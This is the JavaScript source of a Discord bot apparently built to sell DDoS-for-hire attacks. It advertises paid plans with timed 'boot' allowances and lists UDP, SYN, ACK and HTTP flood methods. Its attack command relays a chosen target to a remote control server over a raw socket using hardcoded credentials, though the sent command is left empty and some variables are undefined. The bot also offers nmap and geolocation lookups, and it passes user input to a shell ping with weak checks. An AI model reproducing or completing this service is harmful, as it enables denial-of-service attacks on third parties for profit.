const discord = require('discord.js');
var axios = require('axios');
var http = require("https");
var socket = require('net').Socket();
var sleep = require('sleep');
const config = require('./New_config.json');
const client = new discord.Client();
const { exec } = require('child_process');
function Warn(msg) { var embed = new discord.RichEmbed().setTitle(msg).setColor('#CF9B10'); return embed; }
function isLetter(c) { return c.toLowerCase() != c.toUpperCase(); }
//help
client.on('message', (msg) => { if(msg.content === `${config.prefix}help`) 
{ 
  const embed = new discord.RichEmbed().setTitle('Commands')
  .addField('DDoS',`\r\n${config.prefix}attack [host] [time] [port] [method]\r\n${config.prefix}methods\r\n`)
  .addField('Tools', `\r\n${config.prefix}geoip [host]\r\n${config.prefix}nmap [host]\r\n${config.prefix}ping [host]\r\n`)
  .addField('Client Area', `\r\n${config.prefix}plans\r\n`).setColor('#CF9B10'); msg.channel.send(embed); 
}});
//methods
client.on('message', (msg) => { if(msg.content === `${config.prefix}methods`) 
{ 
 const embed = new discord.RichEmbed().setTitle('Methods').setDescription('\r\n\r\nLayer3 Methods: ICMP\r\n\r\nLayer4 Methods: UDP, UDP-RAW, XMAS, SYN, ACK, ADV, STD, DNS\r\n\r\nLayer7 Methods: HTTP-PPS, HTTP-GHP\r\n\r\n').setColor('#CF9B10'); msg.channel.send(embed); 
}});
//plans
client.on('message', (msg) => { if(msg.content === `${config.prefix}plans`) 
{ 
  const embed = new discord.RichEmbed().setTitle('Paid Plans')
  .addField('Normal','\r\nAll methods\r\nAll Tools Services\r\n200 seconds of boot time\r\n30R$ per month\r\n')
  .addField('Premium','\r\nAll methods\r\nAll Tools Services\r\n300 seconds of boot time\r\n45R$ per month\r\n').setColor('#CF9B10'); msg.channel.send(embed); 
}});
//attack
client.on('message', (msg) => { if(msg.content.startsWith(`${config.prefix}attack`)) 
{
 if(msg.channel.id !== config.channel) { msg.channel.send(Warn('You cant use this type of command here!')); return; }
  if(!msg.member.roles.has(config.normal) && !msg.member.roles.has(config.premium)){ msg.channel.send(Warn('You dont have permissions!')); return; }
  const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
  if(args.length < 4 || args[1].length > 15 || args[1].length < 7 || isLetter(args[1]) || isLetter(args[2]) || isLetter(args[3]) || Number(args[2]) > 65535)  { msg.channel.send(Warn('Something is wrong!')); return; } 
  if(args[1].startsWith('127.') || args[1].startsWith('192.') || args[1].startsWith('10.')) { msg.channel.send(Warn('This ip is blacklisted!')); return; } 
  if(Number(args[3]) < config.mintime) { msg.channel.send(Warn('Min time is ' + config.mintime +  ' seconds!')); return; }
  if(msg.member.roles.has(config.normal)) 
  {
    if(Number(args[3]) > config.maxtime) { msg.channel.send(Warn('Max time is 200 seconds!')); return; }
  }
  else if(msg.member.roles.has(config.premium)) 
  {
    if(Number(args[3]) > config.maxtime) { msg.channel.send(Warn('Max time is 300 seconds!')); return; }
  }
  else { msg.channel.send(Warn('You dont have permissions!')); return;  }
  socket.connect(port, host);
  socket.write(' \r\n'); sleep.sleep(3); //leave this
  socket.write('krawk\r\n'); sleep.sleep(3); //user
  socket.write('123\r\n'); sleep.sleep(3); //pass
  socket.write(''); sleep.sleep(9); //command
  socket.end();
}});
//nmap
client.on('message', (msg) => { if(msg.content.startsWith(`${config.prefix}nmap`)) 
{
 if(msg.channel.id !== config.channel) { msg.channel.send(Warn('You cant use this type of command here!')); return; }
  if(!msg.member.roles.has(config.normal) && !msg.member.roles.has(config.premium)){ msg.channel.send(Warn('You dont have permissions!')); return; }
  const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
  if(args.length < 1 || args[1].length > 15 || args[1].length < 7 || isLetter(args[1]))  { msg.channel.send(Warn('Something is wrong!')); return; } 
  if(args[1].startsWith('127.') || args[1].startsWith('192.') || args[1].startsWith('10.')) { msg.channel.send(Warn('This ip is blacklisted!')); return; } 
  axios.get(`https://api.hackertarget.com/nmap/?q=${args[1]}`).then(response => 
  {
    var strfinished = "";
    for(var i = 3; i < response.data.split(/\r\n|\r|\n/).length - 2; i++) 
    { 
      strfinished += `${response.data.split(/\r\n|\r|\n/)[i]}\r\n`; 
    }
   const embed = new discord.RichEmbed().setTitle('Nmap').setDescription(`\r\n\r\n${strfinished}\r\n\r\n`).setColor('#CF9B10'); msg.channel.send(embed); 
  });
}});
//geoip
client.on('message', (msg) => { if(msg.content.startsWith(`${config.prefix}geoip`)) 
{
  if(msg.channel.id !== config.channel) { msg.channel.send(Warn('You cant use this type of command here!')); return; }
  if(!msg.member.roles.has(config.normal) && !msg.member.roles.has(config.premium)){ msg.channel.send(Warn('You dont have permissions!')); return; }
  const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
  if(args.length < 1 || args[1].length > 15 || args[1].length < 7 || isLetter(args[1]))  { msg.channel.send(Warn('Something is wrong!')); return; } 
  if(args[1].startsWith('127.') || args[1].startsWith('192.') || args[1].startsWith('10.')) { msg.channel.send(Warn('This ip is blacklisted!')); return; } 
  axios.get(`http://ip-api.com/json/${args[1]}`).then(response => 
  {
    var strfinished = "";
    JSON.parse(JSON.stringify(response.data), (key, value) => { strfinished += `${key}: ${value}\r\n`; });
    var strfinished2 = "";
    for(var i = 0; i < 12; i++) { strfinished2 += `${strfinished.split(/\r\n|\r|\n/)[i]}\r\n`; }
    strfinished2 = strfinished2.replace('status: success','').replace('status: fail','').replace('country', 'Country').replace('countryCode', 'Country Code').replace('region', 'Region').replace('regionName','Region Name').replace('city', 'City').replace('zip', 'Zip Code').replace('lat','Latitude').replace('lon','Longitude').replace('timezone','Time Zone').replace('isp','ISP').replace('org','Organization');
    const embed = new discord.RichEmbed().setTitle('Geo Location').setDescription(`\r\n\r\n${strfinished2}\r\n\r\n`).setColor('#CF9B10'); msg.channel.send(embed); 
  });
}});
//ping
client.on('message', (msg) => { if(msg.content.startsWith(`${config.prefix}ping`)) 
{ 
 if(msg.channel.id !== config.channel) { msg.channel.send(Warn('You cant use this type of command here!')); return; }
  if(!msg.member.roles.has(config.normal) && !msg.member.roles.has(config.premium)){ msg.channel.send(Warn('You dont have permissions!')); return; }
  const args = msg.content.slice(config.prefix.length).trim().split(/ +/g);
  if(args.length < 1 || args[1].length > 15 || args[1].length < 7 || isLetter(args[1]))  { msg.channel.send(Warn('Something is wrong!')); return; } 
  if(args[1].startsWith('127.') || args[1].startsWith('192.') || args[1].startsWith('10.')) { msg.channel.send(Warn('This ip is blacklisted!')); return; } 
  exec(`ping ${args[1]}`, (err, stdout, stderr) => 
  {
    var strfinished = "";
    for(var i = 0; i < 6; i++) { strfinished += `${stdout.split(/\r\n|\r|\n/)[i]}\r\n`; }
    const embed = new discord.RichEmbed().setTitle('Ping').setDescription(`\r\n\r\n${strfinished}\r\n\r\n`).setColor('#CF9B10'); msg.channel.send(embed); 
  });
}});
client.on('ready', () => { console.log(`Bot has started, with ${client.users.size} users.`); client.user.setStatus(`${config.prefix}help`); });
client.login(config.token); 